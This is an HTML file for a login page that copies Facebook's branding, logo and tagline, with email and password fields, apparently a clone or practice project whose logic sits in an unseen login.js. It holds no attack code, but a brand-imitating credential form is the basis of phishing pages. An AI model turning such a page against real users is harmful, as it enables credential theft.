<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../styles/styles.css">
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <title>Facebook - Login</title>
</head>

<body>

    <div id="login-container"> <!--container-->

        <!-----------------HERO SECTION----------------->
        <div id="hero"> <!--HERO Container-->


            <img src="../db/assets/logo.svg" alt="facebook">
            <p>Facebook helps you connect and share with the people in your life.</p>

        </div>


        <!-----------------FORM SECTION----------------->
        <div id="login">

            <div style="height: 390px;">

                <div id="status" style="color: crimson;"></div>

                <input type="email" name="mail" placeholder="Email adress" id="email">
                <input type="password" name="password" placeholder="Password" id="password">

                <button type="submit" id="login-btn">Log In</button>

                <div class="hr"></div><!--horizental line in CSS-->
                <button id="new-account">Create New Account</button>       
    
            </div>


        </div>

    </div>

</body>

<html>

<script src="../js/login.js"></script>
